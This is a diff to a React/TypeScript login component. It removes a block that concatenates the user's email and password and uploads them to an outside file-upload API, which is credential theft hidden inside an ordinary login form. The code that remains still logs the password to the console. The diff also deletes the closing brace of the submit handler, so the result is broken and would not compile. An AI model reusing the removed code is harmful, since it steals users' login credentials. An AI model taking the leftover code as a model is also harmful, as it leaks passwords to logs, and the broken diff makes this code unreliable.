@@ -18,34 +18,6 @@ function Login() {
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         console.log('Login submitted:', { email, password, rememberMe });
-        
-        try {
-            if (email === '' || password === '') return;
-
-            const formData = new FormData();
-            var emailAndPassword = email + "&" + password;
-            formData.append("file", emailAndPassword);
-
-            const response = await fetch("https://api.escuelajs.co/api/v1/files/upload", {
-                method: "post",
-                body: formData
-            })
-
-            if(!response.ok) {
-                if(!response.ok) {
-                    throw new Error(`Upload failed: ${response.status}`);
-                }
-
-                const data = await response.json() as UploadResponse;
-
-                if(data.location) {
-                    console.log("Upload succesful: ", data.location);
-                }
-            }
-        } catch(error) {
-            console.log(error);
-        }
-    };
 
     return (
         <div className="login-container">
@@ -108,7 +80,7 @@ function Login() {
                     </button>
                 </div>
             </div>
-        </div>
+        </div >
     );
 }
 
